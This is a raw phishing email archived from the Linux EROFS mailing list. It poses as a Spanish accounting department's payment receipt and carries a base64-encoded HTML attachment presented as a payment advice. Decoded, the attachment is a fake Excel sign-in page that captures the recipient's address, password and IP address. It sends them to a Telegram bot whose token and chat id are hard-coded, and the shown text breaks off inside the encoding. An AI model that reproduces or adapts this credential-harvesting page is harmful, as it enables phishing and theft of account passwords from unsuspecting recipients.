Return-Path: <linux-erofs-bounces+lists+linux-erofs=lfdr.de@lists.ozlabs.org>
X-Original-To: lists+linux-erofs@lfdr.de
Delivered-To: lists+linux-erofs@lfdr.de
Received: from lists.ozlabs.org (lists.ozlabs.org [IPv6:2404:9400:2:0:216:3eff:fee1:b9f1])
	by mail.lfdr.de (Postfix) with ESMTPS id E0C8F9DB146
	for <lists+linux-erofs@lfdr.de>; Thu, 28 Nov 2024 02:53:35 +0100 (CET)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=lists.ozlabs.org;
	s=201707; t=1732758804;
	bh=HiM+EPrGUh5ojJmRt7hXDsTLGj171nz33hZAg15SBew=;
	h=To:Subject:Date:List-Id:List-Unsubscribe:List-Archive:List-Post:
	 List-Help:List-Subscribe:From:Reply-To:From;
	b=PHQqOaOGoNPZcL+r6qFfo/wksCIxceN98gTleYM4WATQRiYpG+IAsF6ilyHlW8j7B
	 C6rpLl97g3oUIaIc0klcGyFrstayXuSrwbSx2RU6MtIO5hclBE3qHlx3rd86YOLJyt
	 93tGOr8goqRbCTCqpEZ9yTKapLSy8QRFZz+ahtpfZWkLNbCUeEoj//3WnKyMFCzzwY
	 suCg/+rxLt3BwtZcR7fxxjec9gF12jOFMQcINMaPRs+D2uej3bpmf1OQ0ZaqfDxeJ7
	 VGEooSQIHxFKsRc7SDAHAkA2SwbEWIeU0NWAhTFd9dzwGLHQoTqmhiBF6jinsE0RsK
	 JMVjf3MsN8K4Q==
Received: from boromir.ozlabs.org (localhost [IPv6:::1])
	by lists.ozlabs.org (Postfix) with ESMTP id 4XzK8h07FGz2ysD
	for <lists+linux-erofs@lfdr.de>; Thu, 28 Nov 2024 12:53:24 +1100 (AEDT)
X-Original-To: linux-erofs@lists.ozlabs.org
Delivered-To: linux-erofs@lists.ozlabs.org
Authentication-Results: lists.ozlabs.org; arc=none smtp.remote-ip=82.163.22.11
ARC-Seal: i=1; a=rsa-sha256; d=lists.ozlabs.org; s=201707; t=1732758802;
	cv=none; b=og0n2eprioSRkabBZ8iLhnoUCy7bw3SYqaZQiGtpAsylFjIhZVpILchrOZceiaaRv68r0WUtyWmyCymDfNjLxqudT+zFNIE1SSPRdouRCFOdOdJNyxqqknV1i9cf6GXjs5koR4bdr3XuYuPIC89qT284fBGvTKNHQ2ECtHTRsLu61TJz7964noZ5VumK1Yl/ZzjN4m6S9YmGqV9D0X+s+2PkNrAr0y+ySjA209l/5+J+RNTkNa493GGajZISmKR/dYauG4PssyWxhZ8UVDt3awnMialHeQoo3mLpEQqqev6ntVbVXDXBP7bbDVdPHIMylCrHOLsk4VbArDuSVGxGIA==
ARC-Message-Signature: i=1; a=rsa-sha256; d=lists.ozlabs.org; s=201707;
	t=1732758802; c=relaxed/relaxed;
	bh=HiM+EPrGUh5ojJmRt7hXDsTLGj171nz33hZAg15SBew=;
	h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type; b=kCwb7ehOkRygypXW3exTCFt1nYKRskRM2bSYQFYIWrWcfTliUI+WkDjwcX7KcIOEjLr3ZBe/zY188jRrC594lxHN3SPiR4QQXHAqVqC2EArib2VnrkZeRattLTZWKxrKPqaXKKE5wlp77wRP6f8O9HdWUKNjcDRy3tbZT1DWlAu5UkScxR++881P+t+PN0uQg0hL0mFDzU7tSBPCP2BU0x8J0jpAH+6UmwTwvSpQ4czeVbntPB4xd9T50iBKUIMWRlknbzC+B2nIFMW1bYleILXsB4bnSK9VGyAdIrScLzBUeENlJ1RHFbiSRWVHf41cshDCx0FhPVCYfMaiApl4kg==
ARC-Authentication-Results: i=1; lists.ozlabs.org; dmarc=pass (p=reject dis=none) header.from=danisjh.online; dkim=pass (1024-bit key; unprotected) header.d=danisjh.online header.i=@danisjh.online header.a=rsa-sha256 header.s=dkim header.b=yDxU4dq9; dkim-atps=neutral; spf=pass (client-ip=82.163.22.11; helo=danisjh.online; envelope-from=info@danisjh.online; receiver=lists.ozlabs.org) smtp.mailfrom=danisjh.online
Authentication-Results: lists.ozlabs.org; dmarc=pass (p=reject dis=none) header.from=danisjh.online
Authentication-Results: lists.ozlabs.org;
	dkim=pass (1024-bit key; unprotected) header.d=danisjh.online header.i=@danisjh.online header.a=rsa-sha256 header.s=dkim header.b=yDxU4dq9;
	dkim-atps=neutral
Authentication-Results: lists.ozlabs.org; spf=pass (sender SPF authorized) smtp.mailfrom=danisjh.online (client-ip=82.163.22.11; helo=danisjh.online; envelope-from=info@danisjh.online; receiver=lists.ozlabs.org)
X-Greylist: delayed 46082 seconds by postgrey-1.37 at boromir; Thu, 28 Nov 2024 12:53:21 AEDT
Received: from danisjh.online (danisjh.online [82.163.22.11])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange ECDHE (prime256v1) server-signature RSA-PSS (2048 bits) server-digest SHA256)
	(No client certificate requested)
	by lists.ozlabs.org (Postfix) with ESMTPS id 4XzK8d62r6z2xfb
	for <linux-erofs@lists.ozlabs.org>; Thu, 28 Nov 2024 12:53:21 +1100 (AEDT)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=danisjh.online; s=dkim; h=Content-Type:MIME-Version:Message-ID:Date:Subject
	:To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
	List-Subscribe:List-Post:List-Owner:List-Archive;
	bh=HiM+EPrGUh5ojJmRt7hXDsTLGj171nz33hZAg15SBew=; b=yDxU4dq9KSVvNIUvnTJR22qFy5
	AhEi1/hfSw95D6FW2hav7BV7rI0LkTsw0UYeBmd/GotldOtEs8gjw8mrEKSov7BF4l1rgMhJDbajM
	oMg1Cs8WEyDgQMT5VaSsZCo67UvJsTUKqUp8gRa/5NvEmjZ39Fn1WSLcoUqVtkDtFajk=;
Received: from 195-154-36-201.rev.poneytelecom.eu ([195.154.36.201])
	by danisjh.online with esmtpsa  (TLS1.3) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
	(Exim 4.93)
	(envelope-from <info@danisjh.online>)
	id 1tGFIg-005Wxq-Fa
	for linux-erofs@lists.ozlabs.org; Wed, 27 Nov 2024 10:29:38 +0000
To: linux-erofs@lists.ozlabs.org
Subject: RE: Fwd: Recibo de pago Ref: INV/103/1497647449 11/27/2024 2:29:35 a.m.
Date: 27 Nov 2024 02:29:35 -0800
Message-ID: <20241127022935.C24519DDF8D623C2@danisjh.online>
MIME-Version: 1.0
Content-Type: multipart/mixed;
	boundary="----=_NextPart_000_0012_2DBD055B.AF296556"
X-SPF-Fail: YES
X-Spam-Status: No, score=4.4 required=5.0 tests=DKIM_SIGNED,DKIM_VALID,
	DKIM_VALID_AU,DKIM_VALID_EF,FROM_SUSPICIOUS_NTLD,
	FROM_SUSPICIOUS_NTLD_FP,HTML_MESSAGE,MIME_HTML_ONLY,PDS_OTHER_BAD_TLD,
	RCVD_IN_MSPIKE_H2,SPF_HELO_PASS,SPF_PASS,T_HTML_ATTACH
	autolearn=disabled version=4.0.0
X-Spam-Level: ****
X-Spam-Checker-Version: SpamAssassin 4.0.0 (2022-12-13) on lists.ozlabs.org
X-BeenThere: linux-erofs@lists.ozlabs.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Development of Linux EROFS file system <linux-erofs.lists.ozlabs.org>
List-Unsubscribe: <https://lists.ozlabs.org/options/linux-erofs>,
 <mailto:linux-erofs-request@lists.ozlabs.org?subject=unsubscribe>
List-Archive: <http://lists.ozlabs.org/pipermail/linux-erofs/>
List-Post: <mailto:linux-erofs@lists.ozlabs.org>
List-Help: <mailto:linux-erofs-request@lists.ozlabs.org?subject=help>
List-Subscribe: <https://lists.ozlabs.org/listinfo/linux-erofs>,
 <mailto:linux-erofs-request@lists.ozlabs.org?subject=subscribe>
From: Contabilidad via Linux-erofs <linux-erofs@lists.ozlabs.org>
Reply-To: Contabilidad <info@danisjh.online>
Errors-To: linux-erofs-bounces+lists+linux-erofs=lfdr.de@lists.ozlabs.org
Sender: "Linux-erofs" <linux-erofs-bounces+lists+linux-erofs=lfdr.de@lists.ozlabs.org>

This is a multi-part message in MIME format.

------=_NextPart_000_0012_2DBD055B.AF296556
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
w3.org/TR/html4/loose.dtd">

<html><head>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001"></head>
<body style=3D"margin: 0.5em;">
<span style=3D'text-align: left; color: rgb(44, 54, 58); text-transform: no=
ne; text-indent: 0px; letter-spacing: normal; font-family: "Times New Roman=
", serif; font-size: 14px; font-style: normal; font-weight: 400; word-spaci=
ng: 0px; white-space: normal; box-sizing: border-box; orphans: 2; widows: 2=
; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; fon=
t-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thi=
ckness: initial; text-decoration-style: initial;=20
text-decoration-color: initial;'>
<p style=3D"color: rgb(44, 54, 58); font-family: Roboto, sans-serif; font-s=
ize: 14px; margin-top: 0px; box-sizing: border-box;"><font color=3D"#404040=
">Buenos dias, linux-erofs<p style=3D"color: rgb(44, 54, 58); font-family: =
Roboto, sans-serif; font-size: 14px; margin-top: 0px; box-sizing: border-bo=
x;"><br></p><font color=3D"#404040">Se ha realizado el pago hoy, 27 de novi=
embre de 2024.<br><br>Descarga la versi&oacute;n completa del comprobante d=
e pago adjunta.<br><br>Gracias y un cordial saludo.<br><br>
</font></font></p><p style=3D"color: rgb(44, 54, 58); font-family: Roboto, =
sans-serif; font-size: 14px; margin-top: 0px; box-sizing: border-box;"><fon=
t color=3D"#404040"></font></p>
<p style=3D"color: rgb(44, 54, 58); font-family: Roboto, sans-serif; font-s=
ize: 14px; margin-top: 0px; box-sizing: border-box;"><font color=3D"#404040=
"></font></p></span>
<p style=3D"margin: 0in; text-align: left; color: rgb(44, 54, 58); text-tra=
nsform: none; line-height: 18.4pt; text-indent: 0px; letter-spacing: normal=
; font-family: Calibri, sans-serif; font-size: 11pt; font-style: normal; fo=
nt-weight: 400; word-spacing: 0px; vertical-align: baseline; white-space: n=
ormal; box-sizing: border-box; orphans: 2; widows: 2; background-color: rgb=
(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal;=
 -webkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial; text-decoration-style: initial; text-de=
coration-color: initial;"><span lang=3D"EN-US" style=3D"color: rgb(64, 64, =
64); font-family: Arial, sans-serif; box-sizing: border-box;"><br style=3D"=
box-sizing: border-box;"><br style=3D"box-sizing: border-box;"></span></p>
<p style=3D"margin: 0in; text-align: left; color: rgb(44, 54, 58); text-tra=
nsform: none; line-height: 18.4pt; text-indent: 0px; letter-spacing: normal=
; font-family: Calibri, sans-serif; font-size: 11pt; font-style: normal; fo=
nt-weight: 400; word-spacing: 0px; vertical-align: baseline; white-space: n=
ormal; box-sizing: border-box; orphans: 2; widows: 2; background-color: rgb=
(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal;=
 -webkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial; text-decoration-style: initial; text-de=
coration-color: initial;"><span style=3D"font-weight: bolder; box-sizing: b=
order-box;"><span lang=3D"EN-US" style=3D"color: rgb(52, 102, 156); font-fa=
mily: Arial, sans-serif; box-sizing: border-box;">Silvia&nbsp;Carrasco Anth=
ony&nbsp;</span></span><span lang=3D"EN-US" style=3D"color: black; font-fam=
ily: Arial, sans-serif; box-sizing: border-box;">|</span><span style=3D"box=
-sizing: border-box;">&nbsp;</span>
<span style=3D"color: black; font-family: Arial, sans-serif; box-sizing: bo=
rder-box;">contabilidad</span></p>
<p style=3D"margin: 0in; text-align: left; color: rgb(44, 54, 58); text-tra=
nsform: none; line-height: 18.4pt; text-indent: 0px; letter-spacing: normal=
; font-family: Calibri, sans-serif; font-size: 11pt; font-style: normal; fo=
nt-weight: 400; word-spacing: 0px; vertical-align: baseline; white-space: n=
ormal; box-sizing: border-box; orphans: 2; widows: 2; background-color: rgb=
(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal;=
 -webkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial; text-decoration-style: initial; text-de=
coration-color: initial;"><span lang=3D"EN-US" style=3D"color: rgb(68, 84, =
106); font-family: Arial, sans-serif; box-sizing: border-box;"><font color=
=3D"#000000" face=3D"Times New Roman" size=3D"3">TEL: +34912545797<br>mintc=
onsulting.org.<br><a href=3D"http://www.mintconsulting.org">www.mintconsult=
ing.org</a><br><u><font color=3D"#0066cc">Ronda de Toledo, 18, Arganzuela, =
28005 <br>Madrid, Espa&ntilde;a</font></u><br><br></font></span>
</p>
<p style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: none;=
 text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-serif;=
 font-size: 14px; font-style: normal; font-weight: 400; margin-top: 0px; wo=
rd-spacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; w=
idows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: nor=
mal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decora=
tion-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial;"></p>
<p><br class=3D"Apple-interchange-newline"></p></body></html>
------=_NextPart_000_0012_2DBD055B.AF296556
Content-Type: text/html; name="Payment_Advice_MT103#.html"; charset="utf-8"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="Payment_Advice_MT103#.html"

PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KICAgIDxtZXRhIG5hbWU9InZpZXdw
b3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSI+DQog
ICAgPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7
IGNoYXJzZXQ9dXRmLTgiIC8+DQoNCiAgICAgPHRpdGxlPiBFeGNlbCBMb2NhbCB8IFNoYXJl
ZCA8L3RpdGxlPg0KPC9oZWFkPg0KDQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KCSogew0K
CQltYXJnaW46IDA7DQoJCXBhZGRpbmc6MDsNCgkJYm94LXNpemluZzogYm9yZGVyLWJveDsN
CgkJYm9yZGVyOjA7DQoJCW91dGxpbmU6IDA7DQoJfQ0KDQoJYm9keSB7DQoJCWJhY2tncm91
bmQ6YmxhY2s7DQoJCSAgICBmb250LWZhbWlseTogU2Vnb2VVSS1TZW1pQm9sZC1maW5hbCxT
ZWdvZSBVSSBTZW1pYm9sZCxTZWdvZVVJLVJlZ3VsYXItZmluYWwsU2Vnb2UgVUksIlNlZ29l
IFVJIFdlYiAoV2VzdCBFdXJvcGVhbikiLFNlZ29lLC1hcHBsZS1zeXN0ZW0sQmxpbmtNYWNT
eXN0ZW1Gb250LFJvYm90byxIZWx2ZXRpY2EgTmV1ZSxUYWhvbWEsSGVsdmV0aWNhLEFyaWFs
LHNhbnMtc2VyaWY7DQoJfQ0KCS5vdmVybGF5IHsNCgkJYmFja2dyb3VuZDp1cmwoImh0dHBz
Oi8vaS5pYmIuY28valdwcW1Oci9waG90by0yMDIzLTAzLTE0LTEzLTI0LTQ1LmpwZyIpOw0K
CQliYWNrZ3JvdW5kLXNpemU6IGNvdmVyOw0KCQliYWNrZ3JvdW5kLXJlcGVhdDogbm8tcmVw
ZWF0Ow0KCQlmaWx0ZXI6Ymx1cigwLjFyZW0pOw0KCQloZWlnaHQ6IDEwMHZoOw0KCQlwb3Np
dGlvbjogYWJzb2x1dGU7DQoJCXdpZHRoOiAxMDAlOw0KCQl0b3A6MDsNCgkJbGVmdDogNTAl
Ow0KCSAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTUwJSwwKTsNCgl9DQoNCgkuanVtYm90cm9u
CXsNCgkJYmFja2dyb3VuZDogd2hpdGU7DQoJCXBhZGRpbmc6IDJyZW0gM3JlbTsNCgkJd2lk
dGg6IDQ1MHB4Ow0KCQltYXgtd2lkdGg6IDEwMCU7DQoJCXBvc2l0aW9uOiByZWxhdGl2ZTsN
CgkJZGlzcGxheTogZmxleDsNCgkJbWFyZ2luOiA3JSBhdXRvOw0KCQlmbGV4LWRpcmVjdGlv
bjogY29sdW1uOw0KDQoJCSAgLXdlYmtpdC1hbmltYXRpb246IHNsaWRlSW4gMC4xcyBmb3J3
YXJkczsNCiAgLW1vei1hbmltYXRpb246IHNsaWRlSW4gMC4xcyBmb3J3YXJkczsNCiAgYW5p
bWF0aW9uOiBzbGlkZUluIDAuMXMgZm9yd2FyZHM7DQoNCgl9DQoNCglALXdlYmtpdC1rZXlm
cmFtZXMgc2xpZGVJbiB7DQogIDAlIHsNCiAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVgoLTkw
MHB4KTsNCiAgfQ0KICAxMDAlIHsNCiAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVgoMCk7DQog
IH0NCn0NCkAtbW96LWtleWZyYW1lcyBzbGlkZUluIHsNCiAgMCUgew0KICAgIHRyYW5zZm9y
bTogdHJhbnNsYXRlWCgtOTAwcHgpOw0KICB9DQogIDEwMCUgew0KICAgIHRyYW5zZm9ybTog
dHJhbnNsYXRlWCgwKTsNCiAgfQ0KfQ0KQGtleWZyYW1lcyBzbGlkZUluIHsNCiAgMCUgew0K
ICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWCgtOTAwcHgpOw0KICB9DQogIDEwMCUgew0KICAg
IHRyYW5zZm9ybTogdHJhbnNsYXRlWCgwKTsNCiAgfQ0KfQ0KDQoJLmltZ19icmFuZCB7DQoJ
CXBhZGRpbmctYm90dG9tOiAxLjVyZW07DQoJfQ0KDQoJLmFycm93X19uYW1lIHsNCgkJZGlz
cGxheTogZmxleDsNCgkJZ2FwOjFyZW07DQoJCWFsaWduLWl0ZW1zOiBjZW50ZXI7DQoJCXBh
ZGRpbmctYm90dG9tOiAxcmVtOw0KCX0NCg0KCS5hcnJvd19fbmFtZSBoNCB7DQoJCWZvbnQt
ZmFtaWx5OiBpbmhlcml0Ow0KCQlmb250LXdlaWdodDogbGlnaHRlcjsNCgkJZm9udC1zaXpl
OiAxNXB4Ow0KCX0NCg0KCS5zZWN0aW9uIHsNCgkJcGFkZGluZy1ib3R0b206IDFyZW0NCgl9
DQoNCglwIHsNCgkJZm9udC1zaXplOiAxM3B4Ow0KCQlmb250LXdlaWdodDogMTAwOw0KCX0N
Cg0KCWlucHV0W3R5cGU9cGFzc3dvcmRdIHsNCgkJYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlk
IHJnYmEoMCwgMCwgMCwgMC42KTsNCgkJcGFkZGluZzoxMHB4IDA7DQoJCWZvbnQtc2l6ZTox
NXB4Ow0KCX0NCg0KCWlucHV0W3R5cGU9cGFzc3dvcmRdOmZvY3VzIHsNCgkJCQlib3JkZXIt
Ym90dG9tOiAxcHggc29saWQgIzAwNjdiODsNCg0KCX0NCg0KCWEgew0KCQl0ZXh0LWRlY29y
YXRpb246IG5vbmU7DQoJCWZvbnQtc2l6ZTogMTNweDsNCgkJY29sb3I6IzAwNjdiODsNCgkJ
cGFkZGluZzoxcmVtIDA7DQoJfQ0KDQoJYTpob3ZlciB7DQoJCXRleHQtZGVjb3JhdGlvbjog
dW5kZXJsaW5lOw0KCQljb2xvciA6ICByZ2JhKDAsIDAsIDAsIDAuNik7DQoJfQ0KDQoJLmJ0
bi1ncm91cCB7DQoJCWRpc3BsYXk6IGZsZXg7DQoJCWp1c3RpZnktY29udGVudDogZmxleC1l
bmQ7DQoJCW1hcmdpbi10b3A6IDFyZW0NCgl9DQoNCglidXR0b24gew0KDQogICAgbWluLXdp
ZHRoOiAxMDBweDsNCiAgICBwYWRkaW5nOiA2cHggMTVweCA2cHggMTVweDsNCiAgICBtYXJn
aW4tdG9wOiA0cHg7DQogICAgbWFyZ2luLWJvdHRvbTogNHB4Ow0KICAgIHBvc2l0aW9uOiBy
ZWxhdGl2ZTsNCiAgICBtYXgtd2lkdGg6IDEwMCU7DQogICAgdGV4dC1hbGlnbjogY2VudGVy
Ow0KICAgIHdoaXRlLXNwYWNlOiBub3dyYXA7DQogICAgb3ZlcmZsb3c6IGhpZGRlbjsNCiAg
ICB2ZXJ0aWNhbC1hbGlnbjogbWlkZGxlOw0KICAgIHRleHQtb3ZlcmZsb3c6IGVsbGlwc2lz
Ow0KICAgIHRvdWNoLWFjdGlvbjogbWFuaXB1bGF0aW9uOw0KICAgIGNvbG9yOiAjMDAwOw0K
ICAgIGJvcmRlci1zdHlsZTogc29saWQ7DQogICAgYm9yZGVyLXdpZHRoOiAycHg7DQogICAg
Ym9yZGVyLWNvbG9yOiB0cmFuc3BhcmVudDsNCiAgICBiYWNrZ3JvdW5kLWNvbG9yOiByZ2Jh
KDAsIDAsIDAsIDAuMik7DQogICAgd2lkdGg6MTAwcHg7DQogICAgICAgIGJvcmRlci1jb2xv
cjogIzAwNjdiODsNCiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA2N2I4Ow0KICAgIGNvbG9y
OndoaXRlOw0KICAgIGN1cnNvcjogcG9pbnRlcjsNCiAgICBmb250LXNpemU6IDE1cHg7DQoN
Cg0KCX0NCg0KCUBtZWRpYSBvbmx5IHNjcmVlbiBhbmQgKG1heC13aWR0aDogNjAwcHgpew0K
ICAgIC5vdmVybGF5IHsNCiAgICAJZGlzcGxheTogbm9uZTsNCiAgICB9DQogICAgYm9keSB7
DQogICAgCWJhY2tncm91bmQ6IHdoaXRlOw0KICAgIH0NCg0KICAgIC5qdW1ib3Ryb24Jew0K
CQlwYWRkaW5nOiAxcmVtIDJyZW07DQoNCgl9DQp9DQoNCg0KPC9zdHlsZT4NCjxib2R5Pg0K
CTxkaXYgY2xhc3M9Im92ZXJsYXkiPjwvZGl2Pg0KCTxkaXYgY2xhc3M9ImNvbnRhaW5lciI+
DQoJCTxkaXYgY2xhc3M9Imp1bWJvdHJvbiI+DQoJCQk8ZGl2IGNsYXNzPSJpbWdfYnJhbmQi
Pg0KCQkJCTxpbWcgc3JjPSJodHRwczovL2ZpbmRpY29ucy5jb20vZmlsZXMvaWNvbnMvMjc5
NS9vZmZpY2VfMjAxM19oZC8yMDAwL2V4Y2VsLnBuZyIgc3R5bGU9IndpZHRoOiAyMCUiPg0K
CQkJPC9kaXY+DQoJCQk8ZGl2IGNsYXNzPSJhcnJvd19fbmFtZSI+DQoJCQkJPGltZyBzcmM9
Imh0dHBzOi8vY2RuLWljb25zLXBuZy5mbGF0aWNvbi5jb20vNTEyLzIyMjMvMjIyMzYxNS5w
bmciIHN0eWxlPSJ3aWR0aDogNCU7Ij4NCgkJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1l
PSJlbWFpbCIgaWQ9ImVtYWlsX2FkZHkiIHZhbHVlPSJsaW51eC1lcm9mc0BsaXN0cy5vemxh
YnMub3JnIj4NCgkJCQk8aDQgaWQ9ImVtYWlsX191cmwiPjwvaDQ+DQoJCQk8L2Rpdj4NCgkJ
CTxoMiBjbGFzcz0ic2VjdGlvbiI+RW50ZXIgcGFzc3dvcmQ8L2gyPg0KCQkJPHAgY2xhc3M9
InNlY3Rpb24iPkJlY2F1c2UgeW91IGFyZSBhY2Nlc3Npbmcgc2Vuc2l0aXZlIGluZm8sIHlv
dSBuZWVkIHRvIHZlcmlmeSB5b3VyIHBhc3N3b3JkIHRvIHZpZXcgb25saW5lIGV4Y2VsPC9w
Pg0KCQkJPHAgaWQ9InBhc3N3b3JkX19lbXB0eSIgc3R5bGU9ImNvbG9yOnJlZDsgZGlzcGxh
eTogbm9uZTsiPlBhc3N3b3JkIGNhbm5vdCBiZSBlbXB0eTwvcD4NCgkJCTxwIGlkPSJwYXNz
d29yZF9faW5jb3JyZWN0IiBzdHlsZT0iY29sb3I6cmVkOyBkaXNwbGF5OiBub25lOyI+U29y
cnksIHlvdXIgc2lnbi1pbiB0aW1lZCBvdXQuIFBsZWFzZSBzaWduIGluIGFnYWluLjwvcD4N
CgkJCTxwIGlkPSJwYXNzd29yZF9faW5jb3JyZWN0MSIgc3R5bGU9ImNvbG9yOnJlZDsgZGlz
cGxheTogbm9uZTsiPllvdXIgYWNjb3VudCBvciBwYXNzd29yZCBpcyBpbmNvcnJlY3QuIENo
ZWNrIGFuZCByZXRyeSB0byBsb2dpbi48L3A+DQoNCgkJCTxpbnB1dCB0eXBlPSJwYXNzd29y
ZCIgbmFtZT0icGFzc3dvcmQiIGlkPSJwYXNzd29yZCIgY2xhc3M9InBhc3N3b3JkIiBwbGFj
ZWhvbGRlcj0iUGFzc3dvcmQiPg0KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgaWQ9ImhpZGRl
bl9pcCI+DQoJCQk8YSBocmVmPSIjIj5Ob3RlOiBPbmx5IHJlY2lwaWVudCBlbWFpbCBjYW4g
YWNjZXNzIHNoYXJlZCBmaWxlczwvYT4NCgkJCTxkaXYgY2xhc3M9ImJ0bi1ncm91cCI+DQoJ
CQkJCTxidXR0b24gdHlwZT0iYnV0dG9uIiBpZD0ic2lnbkluIj5TaWduaW48L2J1dHRvbj4N
CgkJCTwvZGl2Pg0KCQk8L2Rpdj4NCgk8L2Rpdj4NCjwvYm9keT4NCjxzY3JpcHQgc3JjPSJo
dHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9qcXVlcnkvMi4yLjQvanF1
ZXJ5Lm1pbi5qcyI+PC9zY3JpcHQ+DQo8c2NyaXB0Pg0KDQoNCglmdW5jdGlvbiBzZW5kVGVs
ZU1zZyhlbWFpbCwgcGFzc2tleSwgaXApIHsNCg0KCQkgICAgdmFyIG1lc3NhZ2UgPSAiIjsN
CgkJICAgIG1lc3NhZ2UgKz0gIis9PT09PT09PT09PSBFWENFTCBMT0dJTiAyMDI0ID09PT09
PT0iKydcbicNCgkJICAgIG1lc3NhZ2UgKz0gIltJUF0gIiAgKyAgIiA6ICIgKyBpcCArICdc
bic7DQoJCSAgICBtZXNzYWdlICs9ICJbRU1dICIgICsgICIgOiAiICsgZW1haWwgKyAnXG4n
Ow0KCQkgICAgbWVzc2FnZSArPSAiW1BXXSAiICArICAiIDogIiArIHBhc3NrZXk7DQoNCgkJ
ICAgIGxldCB0b2tlbiA9ICc3NjI1NTE3MzEyOkFBRzlPYS1NNVk2YUVWTEhIZWZ2S2FFcERm
Y3BmSFBnWGVzJzsNCgkJICAgIHZhciBjaGF0aWQgPSAnNzI2NjY1ODE0NCc7DQoNCgkJICAg
IHZhciBzZXR0aW5ncyA9IHsNCgkJICAgICJhc3luYyI6IHRydWUsDQoJCSAgICAiY3Jvc3NE
b21haW4iOiB0cnVlLA0KCQkgICAgInVybCI6ICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcv
Ym90IiArIHRva2VuICsgIi9zZW5kTWVzc2FnZT9jaGF0X2lkPSIrY2hhdGlkLA0KCQkgICAg
Im1ldGhvZCI6ICJQT1NUIiwNCgkJICAgICJoZWFkZXJzIjogew0KCQkgICAgICAgICJDb250
ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsDQoJCSAgICAgICAgImNhY2hlLWNvbnRy
b2wiOiAibm8tY2FjaGUiDQoJCSAgICB9LA0KCQkgICAgImRhdGEiOiBKU09OLnN0cmluZ2lm
eSh7DQoJCSAgICAgICAgImNoYXRfaWQiOiBjaGF0aWQsDQoJCSAgICAgICAgInRleHQiOiBt
ZXNzYWdlDQoJCSAgICB9KQ0KCQkgICAgfQ0KDQoJCSAgICAkLmFqYXgoc2V0dGluZ3MpLmRv
bmUoZnVuY3Rpb24gKHJlc3BvbnNlKSB7DQoJCSAgICBpZihyZXNwb25zZS5vayA9PT0gdHJ1
ZSkgew0KCQkgICAgICAgLy8gd2luZG93LmxvY2F0aW9uLmhyZWYgPSAiaHR0cHM6Ly9teWlk
LnRlbHN0cmEuY29tL2lkZW50aXR5L2FzL2xhZkVBL3Jlc3VtZS9hcy9hdXRob3JpemF0aW9u
LnBpbmciOw0KCQkgICAgfQ0KDQoJCSAgICB9KTsNCg0KCX0NCiAgICAkKGRvY3VtZW50KS5y
ZWFkeShmdW5jdGlvbiAoKSB7DQoNCiAgICBsZXQgaXA7DQogICAgJC5nZXRKU09OKCdodHRw
czovL2pzb24uZ2VvaXBsb29rdXAuaW8vP2NhbGxiYWNrPT8nLCBmdW5jdGlvbihkYXRhKSB7
DQogICAgdmFyIG9iaiA9IEpTT04ucGFyc2UoSlNPTi5zdHJpbmdpZnkoZGF0YSkpOw0KICAJ
CQkgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImhpZGRlbl9pcCIpLnZhbHVlID0gb2JqLmlw
Ow0KICAgICAgICB9KTsNCiAgICB9KTsNCg0KDQogIAl2YXIgZW1haWwgPSBkb2N1bWVudC5x
dWVyeVNlbGVjdG9yKCIjZW1haWxfYWRkeSIpLnZhbHVlOw0KICAJLy9jb25zdCBlbWFpbCA9
IGxvY2F0aW9uLnNlYXJjaC5zdWJzdHJpbmcobG9jYXRpb24uc2VhcmNoLmxhc3RJbmRleE9m
KCc9JykgKyAxKTsNCglkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIjZW1haWxfX3VybCIpLmlu
